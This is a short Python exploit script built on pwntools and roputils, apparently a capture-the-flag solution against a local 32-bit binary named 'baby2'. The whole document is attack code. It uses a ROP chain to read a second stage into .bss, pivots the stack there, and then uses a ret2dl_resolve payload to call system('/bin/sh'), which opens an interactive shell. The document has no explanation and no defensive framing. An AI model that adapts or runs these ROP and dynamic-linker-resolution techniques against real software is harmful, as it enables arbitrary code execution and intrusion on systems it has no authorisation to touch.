from roputils import *
from pwn import gdb
from pwn import context
from pwn import process
from pwn import proc
from pwn import ELF
import time

elf = ELF("./baby2")

addr_plt = 0x08048320
addr_start = elf.symbols["_start"]

addr_bss    = elf.bss()
print 'bss is:' + hex(addr_bss)
rop_pop3 = 0x08048509
rop_ret = 0x080482fa

plt_read = 0x08048330
base_stage = addr_bss + 0x800

def craft_read(addr, size):
    payload = p32(plt_read)
    payload += p32(rop_pop3)
    payload += p32(0)    # fd
    payload += p32(addr) # buf
    payload += p32(size) # size
    return payload

p = process("./baby2")

""" Stage 1 (probabilistic write) """
payload1 = b''
payload1 += p32(rop_ret) * ((0x2c - 6 * 4) // 4)
payload1 += craft_read(base_stage, 0x100) # 5 * 4
payload1 += p32(addr_start)               # 4
payload1 += '\x20'

p.send(payload1)

""" Stage 2 (stack pivot) """
payload2 = b'A' * 0x2c
payload2 += p32(base_stage + 4)
payload2 += b'\x00' * (0x12c - len(payload2))

rop = ROP('./baby2')
payload3 = rop.dl_resolve_call(base_stage+60,base_stage+40)
payload3 += rop.fill(40, payload3)
payload3 += rop.string('/bin/sh')
payload3 += rop.fill(60, payload3)
payload3 += rop.dl_resolve_data(base_stage + 60, 'system')
payload3 += rop.fill(0x100, payload3)

time.sleep(0.5)
p.send(payload3)

time.sleep(0.5)
p.send(payload2)

p.interactive()
